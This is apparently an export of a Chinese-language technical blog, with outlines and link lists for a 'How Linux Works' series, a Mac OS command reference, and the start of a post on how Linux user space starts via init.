<li>Levels and Layers</li>
<li>Hardware</li>
<li>The Kernel</li>
<li>User and User Space</li>
<li>第二部分 Overview of the Linux Kernel</li>
<li>进程管理 Process Management</li>
<li>内存管理 Memory Management</li>
<li>设备管理 Device Drivers and Management</li>
<li>系统调用 System Calls</li>
<li>用户空间 User Space</li>
<li>用户管理 User Management</li>
<li>第三部分 Application and Development</li>
<li>The Desktop</li>
<li>The Shell Script</li>
<li>The Development Tools</li>
<li>Compiling and Building</li>
<li>第四部分 Future</li>
</ul>
<span id="more"></span>
<h1 id="第一部分-The-Big-Picture"><a href="#第一部分-The-Big-Picture" class="headerlink" title="第一部分 The Big Picture"></a>第一部分 The Big Picture</h1><h3 id="Levels-and-Layers"><a href="#Levels-and-Layers" class="headerlink" title="Levels and Layers"></a>Levels and Layers</h3><h3 id="Hardware"><a href="#Hardware" class="headerlink" title="Hardware"></a>Hardware</h3><h3 id="Overview-of-the-Linux-Kernel"><a href="#Overview-of-the-Linux-Kernel" class="headerlink" title="Overview of the Linux Kernel"></a>Overview of the Linux Kernel</h3><h4 id="Basic-Commands"><a href="#Basic-Commands" class="headerlink" title="Basic Commands"></a>Basic Commands</h4><h4 id="设备管理-Device-Drivers-and-Management"><a href="#设备管理-Device-Drivers-and-Management" class="headerlink" title="设备管理 Device Drivers and Management"></a>设备管理 Device Drivers and Management</h4><h4 id="磁盘管理-DISKS-and-Filesystems"><a href="#磁盘管理-DISKS-and-Filesystems" class="headerlink" title="磁盘管理 DISKS and Filesystems"></a>磁盘管理 DISKS and Filesystems</h4><h4 id="进程管理-Process-Management"><a href="#进程管理-Process-Management" class="headerlink" title="进程管理 Process Management"></a>进程管理 Process Management</h4><h4 id="内存管理-Memory-Management"><a href="#内存管理-Memory-Management" class="headerlink" title="内存管理 Memory Management"></a>内存管理 Memory Management</h4><h4 id="系统调用-System-Calls"><a href="#系统调用-System-Calls" class="headerlink" title="系统调用 System Calls"></a>系统调用 System Calls</h4><h4 id="用户空间-User-Space"><a href="#用户空间-User-Space" class="headerlink" title="用户空间 User Space"></a>用户空间 User Space</h4><h4 id="用户管理-User-Management"><a href="#用户管理-User-Management" class="headerlink" title="用户管理 User Management"></a>用户管理 User Management</h4><h3 id="未来-Looking-Forward"><a href="#未来-Looking-Forward" class="headerlink" title="未来 Looking Forward"></a>未来 Looking Forward</h3><h1 id="第二部分-Overview-of-the-Linux-Kernel"><a href="#第二部分-Overview-of-the-Linux-Kernel" class="headerlink" title="第二部分 Overview of the Linux Kernel"></a>第二部分 Overview of the Linux Kernel</h1><h2 id="一、Basic-Commands"><a href="#一、Basic-Commands" class="headerlink" title="一、Basic Commands"></a>一、Basic Commands</h2><ul>
<li><a href="https://riboseyim.com/2017/04/26/Linux-Commands/">How Linux Works：BASIC Commands</a></li>
<li><a href="https://riboseyim.com/2018/09/03/Linux-Commands-New/">How Linux Works：BASIC Commands Extension</a></li>
</ul>
<h2 id="二、Files-and-Directory"><a href="#二、Files-and-Directory" class="headerlink" title="二、Files and Directory"></a>二、Files and Directory</h2><h4 id="Files-Modes-and-Permissions"><a href="#Files-Modes-and-Permissions" class="headerlink" title="Files Modes and Permissions"></a>Files Modes and Permissions</h4><ul>
<li><a href="https://linuxhandbook.com/chmod-command/?utm_campaign=chmod-command-examples&amp;utm_medium=social_link&amp;utm_source=missinglettr">Chmod Command Examples</a></li>
</ul>
<h4 id="Listing-and-Manipulating-Processes"><a href="#Listing-and-Manipulating-Processes" class="headerlink" title="Listing and Manipulating Processes"></a>Listing and Manipulating Processes</h4><h4 id="Directory-Hierarchy"><a href="#Directory-Hierarchy" class="headerlink" title="Directory Hierarchy"></a>Directory Hierarchy</h4><h4 id="Running-Commands"><a href="#Running-Commands" class="headerlink" title="Running Commands"></a>Running Commands</h4><h2 id="三、DEVICES-设备管理"><a href="#三、DEVICES-设备管理" class="headerlink" title="三、DEVICES 设备管理"></a>三、DEVICES 设备管理</h2><h3 id="Devices-Files"><a href="#Devices-Files" class="headerlink" title="Devices Files"></a>Devices Files</h3><h3 id="Devices-Path"><a href="#Devices-Path" class="headerlink" title="Devices Path"></a>Devices Path</h3><h3 id="Devices-Extend"><a href="#Devices-Extend" class="headerlink" title="Devices Extend"></a>Devices Extend</h3><h2 id="四、DISKS-and-FileSystems-磁盘管理"><a href="#四、DISKS-and-FileSystems-磁盘管理" class="headerlink" title="四、DISKS and FileSystems 磁盘管理"></a>四、DISKS and FileSystems 磁盘管理</h2><ul>
<li><a href="https://riboseyim.com/2018/06/07/Linux-Works-FileSystem/">How Linux Works：Device and FileSystem</a></li>
</ul>
<h3 id="Partitioning-Disk-Devices"><a href="#Partitioning-Disk-Devices" class="headerlink" title="Partitioning Disk Devices"></a>Partitioning Disk Devices</h3><h3 id="FileSystems"><a href="#FileSystems" class="headerlink" title="FileSystems"></a>FileSystems</h3><h3 id="Swap-Space"><a href="#Swap-Space" class="headerlink" title="Swap Space"></a>Swap Space</h3><h3 id="Traditional-FileSystems"><a href="#Traditional-FileSystems" class="headerlink" title="Traditional FileSystems"></a>Traditional FileSystems</h3><h3 id="Looking-Forwarding"><a href="#Looking-Forwarding" class="headerlink" title="Looking Forwarding"></a>Looking Forwarding</h3><h2 id="五、How-the-Linux-Kernel-Boots"><a href="#五、How-the-Linux-Kernel-Boots" class="headerlink" title="五、How the Linux Kernel Boots"></a>五、How the Linux Kernel Boots</h2><ul>
<li><a href="https://riboseyim.com/2017/05/29/Linux-Works-Boots/">How Linux Works：Boots</a></li>
</ul>
<h2 id="六、How-User-Space-Starts"><a href="#六、How-User-Space-Starts" class="headerlink" title="六、How User Space Starts"></a>六、How User Space Starts</h2><ul>
<li><a href="https://riboseyim.com/2019/04/21/Linux-Works-User-Space/">How Linux Works：用户空间</a></li>
</ul>
<h2 id="七、System-Configuration"><a href="#七、System-Configuration" class="headerlink" title="七、System Configuration"></a>七、System Configuration</h2><h3 id="System-Logging"><a href="#System-Logging" class="headerlink" title="System Logging"></a>System Logging</h3><h3 id="User-Management-Files"><a href="#User-Management-Files" class="headerlink" title="User Management Files"></a>User Management Files</h3><ul>
<li>/etc/passwd File</li>
<li>/etc/shadow File</li>
</ul>
<h3 id="System-Time"><a href="#System-Time" class="headerlink" title="System Time"></a>System Time</h3><h3 id="Batch-Jobs"><a href="#Batch-Jobs" class="headerlink" title="Batch Jobs"></a>Batch Jobs</h3><h4 id="Scheduling-Tasks"><a href="#Scheduling-Tasks" class="headerlink" title="Scheduling Tasks"></a>Scheduling Tasks</h4><h3 id="Users"><a href="#Users" class="headerlink" title="Users"></a>Users</h3><h4 id="User-ID-and-Users-Switching"><a href="#User-ID-and-Users-Switching" class="headerlink" title="User ID and Users Switching"></a>User ID and Users Switching</h4><h4 id="User-Identification-and-Authentication"><a href="#User-Identification-and-Authentication" class="headerlink" title="User Identification and Authentication"></a>User Identification and Authentication</h4><h2 id="八、System-Resource-Utilization"><a href="#八、System-Resource-Utilization" class="headerlink" title="八、System Resource Utilization"></a>八、System Resource Utilization</h2><h3 id="Introduction-to-Resource-Monitoring"><a href="#Introduction-to-Resource-Monitoring" class="headerlink" title="Introduction to Resource Monitoring"></a>Introduction to Resource Monitoring</h3><h3 id="Load-Averages"><a href="#Load-Averages" class="headerlink" title="Load Averages"></a>Load Averages</h3><ul>
<li><a href="https://riboseyim.com/2017/12/11/Linux-Perf-Load/">Linux 性能诊断：负载评估</a></li>
<li><a href="https://riboseyim.com/2017/12/11/Linux-Perf-Netflix/">Linux 性能诊断：快速检查单</a></li>
</ul>
<h3 id="Measuring-Memory"><a href="#Measuring-Memory" class="headerlink" title="Measuring Memory"></a>Measuring Memory</h3><h3 id="Measuring-CPU"><a href="#Measuring-CPU" class="headerlink" title="Measuring CPU"></a>Measuring CPU</h3><h3 id="Measuring-I-O"><a href="#Measuring-I-O" class="headerlink" title="Measuring I/O"></a>Measuring I/O</h3><h3 id="Per-Processes-Monitoring"><a href="#Per-Processes-Monitoring" class="headerlink" title="Per-Processes Monitoring"></a>Per-Processes Monitoring</h3><h2 id="九、Network"><a href="#九、Network" class="headerlink" title="九、Network"></a>九、Network</h2><h3 id="Network-Basic"><a href="#Network-Basic" class="headerlink" title="Network Basic"></a>Network Basic</h3><h3 id="Moving-Files-across-the-Network"><a href="#Moving-Files-across-the-Network" class="headerlink" title="Moving Files across the Network"></a>Moving Files across the Network</h3><h4 id="rsync"><a href="#rsync" class="headerlink" title="rsync"></a>rsync</h4><h4 id="samba"><a href="#samba" class="headerlink" title="samba"></a>samba</h4><h4 id="NFS"><a href="#NFS" class="headerlink" title="NFS"></a>NFS</h4><h3 id="Configuring-Linux-as-a-Router"><a href="#Configuring-Linux-as-a-Router" class="headerlink" title="Configuring Linux as a Router"></a>Configuring Linux as a Router</h3><h3 id="Firewalls"><a href="#Firewalls" class="headerlink" title="Firewalls"></a>Firewalls</h3><h3 id="Ethernet-IP-and-ARP"><a href="#Ethernet-IP-and-ARP" class="headerlink" title="Ethernet,IP and ARP"></a>Ethernet,IP and ARP</h3><h3 id="Wireless-Ethernet"><a href="#Wireless-Ethernet" class="headerlink" title="Wireless Ethernet"></a>Wireless Ethernet</h3><h2 id="十、Network-Application-and-Services"><a href="#十、Network-Application-and-Services" class="headerlink" title="十、Network Application and Services"></a>十、Network Application and Services</h2><h3 id="Network-Servers"><a href="#Network-Servers" class="headerlink" title="Network Servers"></a>Network Servers</h3><h3 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h3><h3 id="Diagnostic-Tools"><a href="#Diagnostic-Tools" class="headerlink" title="Diagnostic Tools"></a>Diagnostic Tools</h3><ul>
<li>lsof</li>
<li>tcpdump</li>
<li>netstat</li>
<li>port scanning</li>
</ul>
<h3 id="Remote-Procedure-Call-RPC"><a href="#Remote-Procedure-Call-RPC" class="headerlink" title="Remote Procedure Call(RPC)"></a>Remote Procedure Call(RPC)</h3><h3 id="Network-Security"><a href="#Network-Security" class="headerlink" title="Network Security"></a>Network Security</h3><h1 id="第三部分-Application-and-Development"><a href="#第三部分-Application-and-Development" class="headerlink" title="第三部分 Application and Development"></a>第三部分 Application and Development</h1><h2 id="一、The-Desktop"><a href="#一、The-Desktop" class="headerlink" title="一、The Desktop"></a>一、The Desktop</h2><h2 id="二、Shell-Scripts"><a href="#二、Shell-Scripts" class="headerlink" title="二、Shell Scripts"></a>二、Shell Scripts</h2><ul>
<li><a href="https://riboseyim.github.io/2019/05/12/Linux-Shell/">How Linux Works：Shell</a></li>
</ul>
<h2 id="三、Development-Tools"><a href="#三、Development-Tools" class="headerlink" title="三、Development Tools"></a>三、Development Tools</h2><h2 id="四、Compiling-and-Building"><a href="#四、Compiling-and-Building" class="headerlink" title="四、Compiling and Building"></a>四、Compiling and Building</h2><h3 id="Compiling-Software-From-C-Source-Code"><a href="#Compiling-Software-From-C-Source-Code" class="headerlink" title="Compiling Software From C Source Code"></a>Compiling Software From C Source Code</h3><h3 id="Building-on-the-BASIC"><a href="#Building-on-the-BASIC" class="headerlink" title="Building on the BASIC"></a>Building on the BASIC</h3><ul>
<li>Web Servers and Application</li>
<li>Databasees</li>
<li>Virtualization</li>
<li>Distributed Computing</li>
<li>Embedded Systems</li>
</ul>
<h1 id="第四部分-Future"><a href="#第四部分-Future" class="headerlink" title="第四部分 Future"></a>第四部分 Future</h1><h2 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h2><h4 id="源码阅读的一般方法"><a href="#源码阅读的一般方法" class="headerlink" title="源码阅读的一般方法"></a>源码阅读的一般方法</h4><ul>
<li>核心子系统（例如进程管理子系统）</li>
<li>结构体、数据结构</li>
<li>关键程序、加载顺序</li>
<li>主题式探索（例如：Linux 支持闰秒吗？）</li>
</ul>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><h4 id="电子书《Linux-Perf-Master》"><a href="#电子书《Linux-Perf-Master》" class="headerlink" title="电子书《Linux Perf Master》"></a>电子书《Linux Perf Master》</h4><ul>
<li><a href="https://riboseyim.gitbook.io/perf">https://riboseyim.gitbook.io/perf</a></li>
<li><a href="https://www.gitbook.com/book/riboseyim/linux-perf-master/details">https://www.gitbook.com/book/riboseyim/linux-perf-master/details</a></li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/banner-LPM-201803.png" alt=""></p>
<h4 id="性能诊断指南"><a href="#性能诊断指南" class="headerlink" title="性能诊断指南"></a>性能诊断指南</h4><ul>
<li><a href="https://riboseyim.com/2017/12/11/Linux-Perf-Load/">Linux 性能诊断：负载评估</a></li>
<li><a href="https://riboseyim.com/2017/12/11/Linux-Perf-Netflix/">Linux 性能诊断：快速检查单</a></li>
<li><a href="https://riboseyim.com/2018/08/07/Linux-Perf-JVM/">Linux 性能诊断：JVM</a></li>
</ul>
<h4 id="How-Linux-Works"><a href="#How-Linux-Works" class="headerlink" title="How Linux Works"></a>How Linux Works</h4><ul>
<li><a href="https://riboseyim.com/2019/04/21/Linux-Works/">How Linux Works：The Big Picture</a></li>
<li><a href="https://riboseyim.com/2017/04/26/Linux-Commands/">How Linux Works：BASIC Commands</a></li>
<li><a href="https://riboseyim.com/2018/09/03/Linux-Commands-New/">How Linux Works：BASIC Commands Extension</a></li>
<li><a href="https://riboseyim.com/2018/06/07/Linux-Works-FileSystem/">How Linux Works：Device and FileSystem</a></li>
<li><a href="https://riboseyim.com/2017/05/29/Linux-Works-Boots/">How Linux Works：Boots</a></li>
<li><a href="https://riboseyim.com/2019/04/21/Linux-Works-User-Space/">How Linux Works：用户空间</a></li>
<li><a href="https://riboseyim.com/2017/12/11/Linux-Works-Memory/">How Linux Works：内存管理</a></li>
<li><a href="https://riboseyim.com/2018/01/08/Linux-Works-Network/">How Linux Works：网络管理</a></li>
<li>Preview<a href="https://riboseyim.com/2019/03/05/Linux-Works-Router/">How Linux Works：路由管理</a></li>
</ul>
<h4 id="动态追踪技术"><a href="#动态追踪技术" class="headerlink" title="动态追踪技术"></a>动态追踪技术</h4><ul>
<li><a href="https://riboseyim.com/2016/11/26/DTrace/">动态追踪技术(一)：DTrace 导论</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MjM5MTY1MjQ3Nw==&amp;mid=2651939588&amp;idx=1&amp;sn=35f71c5f88d1edf23cb2efc812ab8e6c&amp;chksm=bd578c168a20050041c08618281691f0111f61c789097a69095933057618637fc54817815921#rd">动态追踪技术(二)：strace+gdb 溯源 Nginx 内存溢出异常 </a></li>
<li><a href="https://riboseyim.com/2017/04/17/DTrace_FTrace/">动态追踪技术(三)：Tracing Your Kernel Function!</a></li>
<li><a href="https://riboseyim.com/2017/06/27/DTrace_bcc/">动态追踪技术(四)：基于 Linux bcc/BPF 实现 Go 程序动态追踪</a></li>
<li><a href="https://riboseyim.com/2018/02/16/DTrace-Linux/">动态追踪技术(五)：Welcome DTrace for Linux</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://www.cyberpratibha.com/list-users-linux/">How to check List users in Linux | Complete Guide for Beginners</a></li>
<li><a href="https://access.redhat.com/solutions/393663">How To Configure Authenticated NTP Using Symmetric Keys (compatibility with FIPS 140-2)</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>SRE</tag>
        <tag>DevOps</tag>
        <tag>Linux</tag>
        <tag>架构师</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux 操作系统专题</title>
    <url>/2016/05/28/Linux/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><blockquote>
<p>Linux世界的运转，在很多方面像一个自由市场，或者像一个由很多利己个体组成的生态系统。— 《大教堂与集市》</p>
</blockquote>
<ul>
<li>历史</li>
<li>技术</li>
<li>运营</li>
</ul>
<span id="more"></span>
<h2 id="Overview-of-the-OS"><a href="#Overview-of-the-OS" class="headerlink" title="Overview of the OS"></a>Overview of the OS</h2><p><img src="http://riboseyim-qiniu.riboseyim.com/OS-map.png" alt="操作系统图谱v0.1"></p>
<ul>
<li>待完善：增加移动操作系统部分，Linux 与 Android的关系</li>
</ul>
<h2 id="The-History"><a href="#The-History" class="headerlink" title="The History"></a>The History</h2><ul>
<li><a href="https://riboseyim.github.io/2016/04/24/LinusTorvalds/">《Linus Torvalds:Just for Fun》</a></li>
<li><a href="https://riboseyim.github.io/2017/12/19/Linux-Win-Mac/">谁是王者：macOS vs Linux Kernels ？</a></li>
</ul>
<h2 id="How-The-Linux-Works"><a href="#How-The-Linux-Works" class="headerlink" title="How The Linux Works"></a>How The Linux Works</h2><h4 id="电子书《Linux-Perf-Master》"><a href="#电子书《Linux-Perf-Master》" class="headerlink" title="电子书《Linux Perf Master》"></a>电子书《Linux Perf Master》</h4><ul>
<li><a href="https://riboseyim.gitbook.io/perf">https://riboseyim.gitbook.io/perf</a></li>
<li><a href="https://www.gitbook.com/book/riboseyim/linux-perf-master/details">https://www.gitbook.com/book/riboseyim/linux-perf-master/details</a></li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/banner-LPM-201803.png" alt=""></p>
<h4 id="性能诊断指南"><a href="#性能诊断指南" class="headerlink" title="性能诊断指南"></a>性能诊断指南</h4><ul>
<li><a href="https://riboseyim.com/2017/12/11/Linux-Perf-Load/">Linux 性能诊断：负载评估</a></li>
<li><a href="https://riboseyim.com/2017/12/11/Linux-Perf-Netflix/">Linux 性能诊断：快速检查单</a></li>
<li><a href="https://riboseyim.com/2018/08/07/Linux-Perf-JVM/">Linux 性能诊断：JVM</a></li>
</ul>
<h4 id="How-Linux-Works"><a href="#How-Linux-Works" class="headerlink" title="How Linux Works"></a>How Linux Works</h4><ul>
<li><a href="https://riboseyim.com/2019/04/21/Linux-Works/">How Linux Works：The Big Picture</a></li>
<li><a href="https://riboseyim.com/2017/04/26/Linux-Commands/">How Linux Works：BASIC Commands</a></li>
<li><a href="https://riboseyim.com/2018/09/03/Linux-Commands-New/">How Linux Works：BASIC Commands Extension</a></li>
<li><a href="https://riboseyim.com/2018/06/07/Linux-Works-FileSystem/">How Linux Works：Device and FileSystem</a></li>
<li><a href="https://riboseyim.com/2017/05/29/Linux-Works-Boots/">How Linux Works：Boots</a></li>
<li><a href="https://riboseyim.com/2019/04/21/Linux-Works-User-Space/">How Linux Works：用户空间</a></li>
<li><a href="https://riboseyim.com/2017/12/11/Linux-Works-Memory/">How Linux Works：内存管理</a></li>
<li><a href="https://riboseyim.com/2018/01/08/Linux-Works-Network/">How Linux Works：网络管理</a></li>
<li>Preview<a href="https://riboseyim.com/2019/03/05/Linux-Works-Router/">How Linux Works：路由管理</a></li>
</ul>
<h4 id="动态追踪技术"><a href="#动态追踪技术" class="headerlink" title="动态追踪技术"></a>动态追踪技术</h4><ul>
<li><a href="https://riboseyim.com/2016/11/26/DTrace/">动态追踪技术(一)：DTrace 导论</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MjM5MTY1MjQ3Nw==&amp;mid=2651939588&amp;idx=1&amp;sn=35f71c5f88d1edf23cb2efc812ab8e6c&amp;chksm=bd578c168a20050041c08618281691f0111f61c789097a69095933057618637fc54817815921#rd">动态追踪技术(二)：strace+gdb 溯源 Nginx 内存溢出异常 </a></li>
<li><a href="https://riboseyim.com/2017/04/17/DTrace_FTrace/">动态追踪技术(三)：Tracing Your Kernel Function!</a></li>
<li><a href="https://riboseyim.com/2017/06/27/DTrace_bcc/">动态追踪技术(四)：基于 Linux bcc/BPF 实现 Go 程序动态追踪</a></li>
<li><a href="https://riboseyim.com/2018/02/16/DTrace-Linux/">动态追踪技术(五)：Welcome DTrace for Linux</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://book.douban.com/subject/26663519/">池建强:《跨越边界》</a></li>
<li><a href="http://www.ituring.com.cn/book/1501">图灵社区:《码农增刊·Linus与Linux》</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>SRE</tag>
        <tag>DevOps</tag>
        <tag>Linux</tag>
        <tag>OpenSource</tag>
        <tag>架构师</tag>
        <tag>Developer</tag>
        <tag>OperatingSystem</tag>
      </tags>
  </entry>
  <entry>
    <title>Mac OS 操作系统专题</title>
    <url>/2019/01/05/Mac/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>The History</li>
<li>Overview of the Mac</li>
<li>Application and Development</li>
<li>Future</li>
</ul>
<span id="more"></span>
<p>This article is part of an <strong>Mac Operating System</strong> tutorial series. Make sure to check out my other articles as well:</p>
<ul>
<li><a href="https://riboseyim.com/2017/12/19/Linux-Win-Mac/">谁是王者：macOS vs Linux Kernels ？</a></li>
<li><a href="https://riboseyim.com/2017/09/15/Visualization-OmniGraffle/">数据可视化（一）思维利器 OmniGraffle for Mac 使用指南</a></li>
<li><a href="https://riboseyim.com/2017/06/03/Writing-WriterToolChain/">我的写作工具链</a></li>
</ul>
<h2 id="The-Big-Picture"><a href="#The-Big-Picture" class="headerlink" title="The Big Picture"></a>The Big Picture</h2><h3 id="The-History"><a href="#The-History" class="headerlink" title="The History"></a>The History</h3><ul>
<li><a href="https://riboseyim.com/2017/12/19/Linux-Win-Mac/">谁是王者：macOS vs Linux Kernels ？</a></li>
</ul>
<h2 id="Overview-of-the-Mac"><a href="#Overview-of-the-Mac" class="headerlink" title="Overview of the Mac"></a>Overview of the Mac</h2><h4 id="快键键"><a href="#快键键" class="headerlink" title="快键键"></a>快键键</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">⌘——Command ()</span><br><span class="line"></span><br><span class="line">⌃ ——Control</span><br><span class="line"></span><br><span class="line">⌥——Option (alt)</span><br><span class="line"></span><br><span class="line">⇧——Shift</span><br><span class="line"></span><br><span class="line">⇪——Caps Lock</span><br><span class="line"></span><br><span class="line">fn——功能键</span><br></pre></td></tr></table></figure>
<h4 id="Basic-Commands"><a href="#Basic-Commands" class="headerlink" title="Basic Commands"></a>Basic Commands</h4><div class="table-container">
<table>
<thead>
<tr>
<th>操作</th>
<th>Linux</th>
<th>Mac</th>
<th>Windows</th>
</tr>
</thead>
<tbody>
<tr>
<td>字符匹配</td>
<td>grep</td>
<td>grep</td>
<td>findstr</td>
</tr>
<tr>
<td>查看网卡</td>
<td>ifconfig</td>
<td>ifconfig</td>
<td>ipconfig</td>
</tr>
<tr>
<td>查看网络路由</td>
<td>route -n <br> netstat -ar</td>
<td>netstat -ar</td>
<td>route PRINT</td>
</tr>
<tr>
<td>查看网络连接</td>
<td>netstat -an</td>
<td>netstat -an</td>
<td>netstat -an</td>
</tr>
<tr>
<td>更新动态库</td>
<td>ldconfig</td>
<td>update_dyld_shared_cache</td>
<td>——</td>
</tr>
<tr>
<td>hosts</td>
<td>/etc/hosts/<br>/private/etc/hosts</td>
<td>——-</td>
<td></td>
</tr>
<tr>
<td>debug</td>
<td>strace</td>
<td>dtruss</td>
<td>——-</td>
</tr>
<tr>
<td>查看库依赖</td>
<td>ldd</td>
<td>otool -L</td>
<td>——</td>
</tr>
<tr>
<td>进程管理</td>
<td>ps</td>
<td>ps</td>
<td>tasklist</td>
</tr>
<tr>
<td>进程管理</td>
<td>kill</td>
<td>kill</td>
<td>taskkill /pid /T /F</td>
</tr>
<tr>
<td>环境变量</td>
<td>env</td>
<td>[print]printenv <br> [init] ~/.bash_profile</td>
<td></td>
</tr>
<tr>
<td>压缩加密</td>
<td></td>
<td>zip -e ./jiami.zip aa.txt</td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
</div>
<h4 id="磁盘管理"><a href="#磁盘管理" class="headerlink" title="磁盘管理"></a>磁盘管理</h4><ul>
<li>diskutil</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ diskutil list</span><br><span class="line">$ diskutil mountDisk /dev/disk2</span><br><span class="line">Volume(s) mounted successfully</span><br><span class="line">$ diskutil unmountDisk /dev/disk2</span><br><span class="line">Unmount of all volumes on disk2 was successful</span><br></pre></td></tr></table></figure>
<h4 id="网络管理"><a href="#网络管理" class="headerlink" title="网络管理"></a>网络管理</h4><ul>
<li>NAT</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/Library/Preferences/VMware Fusion/vmnet8/nat.conf</span><br><span class="line"># NAT gateway address</span><br><span class="line">ip = 192.168.213.2</span><br><span class="line">netmask = 255.255.255.0</span><br></pre></td></tr></table></figure>
<h2 id="Application-and-Development"><a href="#Application-and-Development" class="headerlink" title="Application and Development"></a>Application and Development</h2><h3 id="Personal-Level"><a href="#Personal-Level" class="headerlink" title="Personal Level"></a>Personal Level</h3><ul>
<li><a href="https://riboseyim.com/2017/06/03/Writing-WriterToolChain/">我的写作工具链</a></li>
</ul>
<h3 id="Enterprise-Level"><a href="#Enterprise-Level" class="headerlink" title="Enterprise Level"></a>Enterprise Level</h3><ul>
<li><a href="https://riboseyim.com/2017/09/15/Visualization-OmniGraffle/">数据可视化（一）思维利器 OmniGraffle for Mac 使用指南</a></li>
</ul>
<h4 id="Hardware"><a href="#Hardware" class="headerlink" title="Hardware"></a>Hardware</h4><ul>
<li><a href="https://www.youtube.com/watch?v=FzcBL1NBtik">How to Fix Early 2015 MacBook Pro Touchpad Keyboard</a></li>
<li><a href="https://zh.ifixit.com/Answers/View/313001/Keyboard+and+trackpad+don%27t+work,+loose+cable">Keyboard and trackpad don’t work, loose cable?</a></li>
<li><a href="https://www.amazon.com/gp/product/B0711CZPXJ/ref=oh_aui_detailpage_o00_s00?ie=UTF8&amp;psc=1&amp;tag=ifixitam-20">touchpad TrackPad 丝带排线替换821 – 00184-a 适用于 Apple MacBook Pro Retina 33 cm A1502早2015</a></li>
</ul>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://devstreaming-cdn.apple.com/videos/wwdc/2019/710aunvynji5emrl/710/710_whats_new_in_apple_file_systems.pdf">What’s New in Apple Filesystems</a></li>
<li><a href="https://mp.weixin.qq.com/s/Q2IEE4t3naR6j3iP78V29g">推荐一些 Mac 上比较好用的软件</a></li>
<li><a href="http://www.jianshu.com/p/9257e1e7ac39">scomper:OmniFocus 2 for Mac 的使用指南</a></li>
<li><a href="https://support.omnigroup.com/doc-assets/OmniPlan-Mac/OmniPlan-Mac-v3.0.0.1/zh/EPUB/xhtml/03_tutorial.xhtml">OmniPlan 使用教程 | OmniPlan 3 for Mac 用户手册</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Mac</tag>
        <tag>OperatingSystem</tag>
        <tag>工具癖</tag>
      </tags>
  </entry>
  <entry>
    <title>How Linux Works:User Space</title>
    <url>/2019/04/21/Linux-Works-User-Space/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>Linux 用户空间启动顺序</p>
<span id="more"></span>
<h2 id="How-User-Space-Starts"><a href="#How-User-Space-Starts" class="headerlink" title="How User Space Starts"></a>How User Space Starts</h2><ol>
<li>init</li>
<li>必要的低层服务例如：udevd 和 syslog</li>
<li>网络配置</li>
<li>中高层服务例如 ：cron , printing</li>
<li>登录提示、图形界面及其它高层次应用</li>
</ol>
<h4 id="一号进程"><a href="#一号进程" class="headerlink" title="一号进程"></a>一号进程</h4><p>init（initialization的简写）是 Unix 和 类Unix 系统中用来产生其它所有进程的程序。它以守护进程的方式存在，其进程号为1。Linux系统在开机时加载Linux内核后，便由Linux内核加载init程序，由init程序完成余下的开机过程，比如加载运行级别，加载服务，引导Shell/图形化界面等等。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@li1437-101 ~]<span class="comment"># ps -ef | grep init</span></span><br><span class="line">root         1     0  0 Feb27 ?        00:03:05 /sbin/init</span><br><span class="line">root     28683 28663  0 02:44 pts/0    00:00:00 grep --color=auto init</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">// Mac OS</span><br><span class="line">bash-3.2$ ps -ef | grep init</span><br><span class="line">	0   243     1   0 15 517  ??         0:00.74 /System/Library/CoreServices/CrashReporterSupportHelper server-init</span><br><span class="line">	0   533     1   0 15 517  ??         0:02.07 /System/Library/CoreServices/SubmitDiagInfo server-init</span><br><span class="line">  501 52150     1   0 日01下午 ??         0:15.49 /usr/libexec/secinitd</span><br><span class="line">	0 69864     1   0 11:35上午 ??         0:00.20 /usr/libexec/secinitd</span><br><span class="line">	0 72830     1   0  1:51下午 ??         0:00.19 /usr/libexec/secinitd</span><br><span class="line">Darwin ACA80166.ipt.aol.com 16.5.0 Darwin Kernel Version 16.5.0: Fri Mar  3 16:52:33 PST 2017; root:xnu-3789.51.2~3/RELEASE_X86_64 x86_64</span><br><span class="line">bash-3.2$</span><br></pre></td></tr></table></figure>
<p>在Linux发行版中，init有三种主要的实现形式：</p>
<ol>
<li><strong>System V init</strong>: 传统的</li>
<li><strong>systemd</strong>: 所有主流Linux发行版中的标准init</li>
<li><strong>Upstart</strong>: Ubuntu</li>
</ol>
<p>Android 和 BSD （运行存放于’/etc/rc’的初始化 shell 脚本）也有它们自己的init版本，一些发行版也将System V init 修改为类似BSD风格的实现。目前大部分Linux发行版都已采用新的systemd替代System V和Upstart，但systemd向下兼容System V。</p>
